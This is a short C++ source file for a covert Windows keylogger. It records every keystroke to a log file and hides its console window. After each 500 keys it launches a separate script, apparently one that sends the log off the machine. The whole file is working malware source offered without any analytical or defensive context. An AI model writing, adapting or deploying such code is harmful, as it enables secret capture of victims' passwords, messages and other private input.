#include <iostream>
#include <Windows.h>
#include <cstdlib>
#include <fstream>

using namespace std;

int Save(int _key, char *file, int count);


//hide window when calling the sender
void Stealth() 
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}
int main() {
	FreeConsole();
	char i;
	int count = 0;
	while (true) {
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, "./log.txt", count);
				count += 1;
			}
			if (count == 500) {
				Stealth();
				system("\"\"%USERPROFILE%\\Documents\\system_file\\sender.pyw\"");
				count = 0;
				std::ofstream ofs("./log.txt", std::ios::out | std::ios::trunc); // clear contents
			}
		}
	}
	return 0;
}

int Save(int _key, char *file, int count) {
	cout << _key << endl;
	FILE* OUTPUT_FILE;
	//FILE *fprecv = fopen(TEXT(file), "wb");
	OUTPUT_FILE = fopen(file, "a+");
	
	if (OUTPUT_FILE) {
		if (_key == VK_SHIFT) {
			fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
		}
		else if (_key == VK_BACK) {
			fprintf(OUTPUT_FILE, "%s", "[BACK]");
		}
		else if (_key == VK_LBUTTON) {
			fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
		}
		else if (_key == VK_RETURN) {
			fprintf(OUTPUT_FILE, "%s", "[RETURN]");
		}
		else if (_key == VK_SPACE) {
			fprintf(OUTPUT_FILE, "%s", "[SPACE]");
		}
		else {
			fprintf(OUTPUT_FILE, "%s", &_key);
		}
		if (count % 20 == 0) {
			fprintf(OUTPUT_FILE, "%s", "\n");
		}
		fclose(OUTPUT_FILE);
	}
		return 0;

}
